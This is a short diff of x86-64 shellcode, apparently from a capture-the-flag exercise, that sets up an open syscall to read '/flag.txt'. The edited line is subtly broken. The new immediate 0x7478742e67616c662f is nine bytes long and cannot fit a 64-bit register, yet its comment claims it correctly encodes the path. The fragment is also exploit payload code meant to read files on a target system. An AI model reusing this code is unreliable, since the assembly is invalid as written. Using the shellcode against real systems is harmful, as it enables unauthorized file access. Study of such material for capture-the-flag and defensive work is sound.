@@ -3,7 +3,7 @@
 
     xor rsi, rsi
     push rsi                    ; push null terminator
-    mov rdi, 0x7478742e676c662f ; '/flag.txt' (little-endian)
+    mov rdi, 0x7478742e67616c662f ; '/flag.txt' (little-endian)
     push rdi
     mov al, 2                   ; open syscall (1 byte)
     mov rdi, rsp                ; filename pointer
